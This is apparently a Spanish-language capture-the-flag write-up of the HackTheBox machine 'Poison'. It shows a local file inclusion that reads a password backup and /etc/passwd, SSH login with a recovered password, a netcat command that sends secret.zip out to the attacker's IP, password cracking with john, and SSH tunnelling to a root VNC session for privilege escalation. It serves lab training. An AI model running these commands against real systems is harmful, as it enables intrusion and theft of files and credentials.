---
title: HTB - Poison
published: true
categories: [Linux]
tags: [eJPT, eWPT, Media]
---

<img src="/assets/HTB/Poison/poison.png">

¡Hola!
Vamos a resolver de la máquina `Poison` de dificultad "Media" de la plataforma [HackTheBox](https://hackthebox.com/).

Técnicas Vistas: 

- **Local File Inclusion (LFI)**
- **LFI to RCE - Log Poisoning**
- **Cracking ZIP file**
- **Abusing VNC - vncviewer [Privilege Escalation]**

### Preparación Entorno

* * *

Antes de iniciar la fase de enumeración y reconocimiento procederemos a crear un directorio de trabajo con el nombre `Poison`. Una vez creado accedemos al directorio y con la ayuda de la función que tenemos definida en la zshrc `mkt` crearemos cuatro directorios de trabajo `nmap, content, exploits y scripts` donde almacenaremos de una manera ordenada toda la información que vayamos recopilando de la máquina en función de su naturaleza.

```bash
function mkt(){
    mkdir {nmap,content,exploits,scripts}
}
```

### Reconocimiento

* * *

Accedemos al directorio de trabajo `nmap` e iniciamos nuestra fase de reconocimiento realizando un `ping` a la IP de la máquina para comprobar que esté activa y detectamos su sistema operativo basándonos en el `ttl` de una traza **ICMP**.

```bash
❯ ping -c 1 10.10.10.84
PING 10.10.10.84 (10.10.10.84) 56(84) bytes of data.
64 bytes from 10.10.10.84: icmp_seq=1 ttl=63 time=38.3 ms

--- 10.10.10.84 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 38.334/38.334/38.334/0.000 ms
```
Identificamos que es una maquina **Linux** debido a su ttl (time to live) correspondiente a 63 (Disminuye en 1 debido a que realiza un salto adicional en el entorno de HackTHeBox).

* TTL => 64 Linux
* TTL => 128 Windows

Continuamos con la enumeración de los **65535** puertos en la máquina.

```java
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.84 -oG allPorts

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```
Luego de identificar los puertos abiertos `OPEN`, se procede a escanear servicios y versiones que puedan estar corriendo en los puertos abiertos detectados.

```bash
nmap -sCV -p22,80,8065 10.10.10.84 -oN targeted

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2 (FreeBSD 20161230; protocol 2.0)
| ssh-hostkey: 
|   2048 e3:3b:7d:3c:8f:4b:8c:f9:cd:7f:d2:3a:ce:2d:ff:bb (RSA)
|   256 4c:e8:c6:02:bd:fc:83:ff:c9:80:01:54:7d:22:81:72 (ECDSA)
|_  256 0b:8f:d5:71:85:90:13:85:61:8b:eb:34:13:5f:94:3b (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((FreeBSD) PHP/5.6.32)
|_http-server-header: Apache/2.4.29 (FreeBSD) PHP/5.6.32
|_http-title: Site doesn t have a title (text/html; charset=UTF-8).
Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd
```

### Reconocimiento Web

* * *

Iniciamos el reconocimiento del servicio web con la herramienta `whatweb` la cual nos muestra información sobre las tecnologías web que incluyen sistemas de gestión de contenido (CMS), plataformas de blogs, paquetes de estadísticas / análisis, bibliotecas JavaScript, servidores web y dispositivos integrados.

```bash
❯ whatweb http://10.10.10.84
http://10.10.10.84 [200 OK] Apache[2.4.29], Country[RESERVED][ZZ], HTTPServer[FreeBSD][Apache/2.4.29 (FreeBSD) PHP/5.6.32], IP[10.10.10.84], PHP[5.6.32], X-Powered-By[PHP/5.6.32]
```


Accedemos a la web presente en el puerto 80 y vemos une estamos ante una web temporal para testear scripts en php


<img src="/assets/HTB/Poison/web.png">


En el input ponemos `listfiles.php` y podemos ver como hace referencia a los scripts en php que podemos listar y vemos un archivo `pwdbackup.txt`


<img src="/assets/HTB/Poison/list.png">


Como podemos apuntar directamente a los archivos en la url probamos a ver si nos muestra el contenido de pwdbackup.txt


<img src="/assets/HTB/Poison/pwd.png">


Tenemos una password en base64 que parece ha sido codificada 13 veces al menos. Vamos a tratar de descodificar en nuestro equipo esta password

```bash
❯ curl -s -X GET "http://10.10.10.84/browse.php?file=pwdbackup.txt" | grep -v "password" | tr -d '\n' | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d ; echo
Charix!2#4%6&8(0
```
Tenemos una clave pero nos falta saber usuarios válidos. Como tenemos la capacidad de apuntar a archivos vamos a tratar de ejecutar un Directory Path Traversal para listar el contenido de `/etc/passwd` y así poder listar usuarios del sistema


<img src="/assets/HTB/Poison/passwd.png">


Nos conectamos por ssh con usuario `charix` y password `Charix!2#4%6&8(0`

```bash
❯ ssh charix@10.10.10.84
Password for charix@Poison:
Last login: Thu Nov 10 10:10:37 2022 from 10.10.14.24
FreeBSD 11.1-RELEASE (GENERIC) #0 r321309: Fri Jul 21 02:08:28 UTC 2017

Welcome to FreeBSD!

Release Notes, Errata: https://www.FreeBSD.org/releases/
Security Advisories:   https://www.FreeBSD.org/security/
FreeBSD Handbook:      https://www.FreeBSD.org/handbook/
FreeBSD FAQ:           https://www.FreeBSD.org/faq/
Questions List: https://lists.FreeBSD.org/mailman/listinfo/freebsd-questions/
FreeBSD Forums:        https://forums.FreeBSD.org/

Documents installed with the system are in the /usr/local/share/doc/freebsd/
directory, or can be installed later with:  pkg install en-freebsd-doc
For other languages, replace "en" with a language code like de or fr.

Show the version of FreeBSD installed:  freebsd-version ; uname -a
Please include that output and any error messages when posting questions.
Introduction to manual pages:  man man
FreeBSD directory layout:      man hier

Edit /etc/motd to change this login announcement.
"man tuning" gives some tips how to tune performance of your FreeBSD system.
		-- David Scheidt <dscheidt@tumbolia.com>
csh: The terminal database could not be opened.
csh: using dumb terminal settings.
charix@Poison:~ % 
```

La flag de usuario la podemos encontrar en el mismo directorio donde nos encotramos

```bash
charix@Poison:~ % ls
secret.zip	user.txt
charix@Poison:~ % cat user.txt 
eaacdfb2d141b72a5***************
```

### Escalada Privilegios

* * *

En el directorio donde nos encontramos vemos un archivo `secret.zip`. Lo transferimos a nuestra máquina con netcat

```bash
#MAQUINA VICTIMA
charix@Poison:~ % nc 10.10.14.24 443 < secret.zip

#MAQUINA ATACANTE
❯ nc -nlvp 443 > secret.zip
listening on [any] 443 ...
connect to [10.10.14.24] from (UNKNOWN) [10.10.10.84] 62672
```

Si tratamos de descomprimir el archivo veremos que está protegido por contraseña. Con `zip2john` extraemos el hash y con `john` y el diccionario `rockyou.txt` tratamos de obtener la contraseña

```bash
❯ zip2john secret.zip > hash
ver 2.0 secret.zip/secret PKZIP Encr: cmplen=20, decmplen=8, crc=77537827

❯ john -w:/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:01 DONE (2022-11-10 12:25) 0g/s 10028Kp/s 10028Kc/s 10028KC/s !jonaluz28!..*7¡Vamos!
Session completed
```
Vaya, parece que no hemos tenido suerte. Probamos por si se reutiliza contraseña obtenida anteriormente para el usuario charix

```bash
❯ unzip secret.zip
Archive:  secret.zip
[secret.zip] secret password: 
 extracting: secret                  
❯ ls
 hash   secret   secret.zip
❯ cat secret
───────┬──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: secret
───────┼──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ ��[|Ֆz!
───────┴──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```
Conseguimos descomprimir el archivo pero vemos que no es legible

Siguiendo la enumeración procedemos a listar puertos que estén abiertos de manera interna

```bash
charix@Poison:~ % netstat -na -p tcp
Active Internet connections (including servers)
Proto Recv-Q Send-Q Local Address          Foreign Address        (state)
tcp4       0     44 10.129.1.254.22        10.10.14.24.35014      ESTABLISHED
tcp4       0      0 127.0.0.1.25           *.*                    LISTEN
tcp4       0      0 *.80                   *.*                    LISTEN
tcp6       0      0 *.80                   *.*                    LISTEN
tcp4       0      0 *.22                   *.*                    LISTEN
tcp6       0      0 *.22                   *.*                    LISTEN
tcp4       0      0 127.0.0.1.5801         *.*                    LISTEN
tcp4       0      0 127.0.0.1.5901         *.*                    LISTEN
```

Detectamos puertos 5801 y 5901 abiertos internamente. Tras buscar para qué se utilizan estos puertos descubrimos que se utilizan para servicio VNC. Adicionalmente listamos procesos que están ejecutándose en la máquina víctima y localizamos un proceso `tightvnc` ejecutado por root

```bash
root    608   0.0  0.9  23620  8872 v0- I    09:28     0:00.04 Xvnc :1 -desktop X -httpd /usr/local/share/tightvnc/classes -auth /root/.Xauthority -geometry 1280x800 -depth 24 -rfbwait 1
```

Como no tenemos acceso directamente a estos puertos utilizaremos la herramienta `proxychains` para llegar a estos puertos por Dynamic Port Forwarding. Primero debemos agregar `scoks4 127.0.0.1 1080` línea al final del archivo `/etc/proxychains.conf`. Nos volvemos a conectar por ssh con el usuario `charix` per esta vez agregandole `-D 1080` 

```bash
❯ ssh charix@10.129.1.254 -D 1080
```
Con proxychains y la heramienta `vncviewer` ya podemos conectarnos al servicio VNC proporcionando el archivo `secret` descomprmido anteriormente

```bash
❯ proxychains vncviewer -passwd secret 127.0.0.1:5901
ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-127.0.0.1:1080-<><>-127.0.0.1:5901-<><>-OK
Connected to RFB server, using protocol version 3.8
Enabling TightVNC protocol extensions
Performing standard VNC authentication
Authentication successful
Desktop name "root's X desktop (Poison:1)"
VNC server default format:
  32 bits per pixel.
  Least significant byte first in each pixel.
  True colour: max red 255 green 255 blue 255, shift red 16 green 8 blue 0
Using default colormap which is TrueColor.  Pixel format:
  32 bits per pixel.
  Least significant byte first in each pixel.
  True colour: max red 255 green 255 blue 255, shift red 16 green 8 blue 0
Same machine: preferring raw encoding
```

Se abre una consola VNC con credenciales de root. Desde aquí podemos asignar privilegios SUID a la bash


<img src="/assets/HTB/Poison/vnc.png">


De vuelta en la consola de `charix` podemos spawnear una bash con privilegios de root y acceder a la flag

```bash
charix@Poison:~ % sh -p
Cannot read termcap database;
using dumb terminal settings.
# whoami
root
# cat /root/root.txt
716d04b188419cf2b***************
```
Hemos completado la máquina **Poison** de HackTheBox!! Happy Hacking!!


<img src="/assets/HTB/Poison/pwned.png">
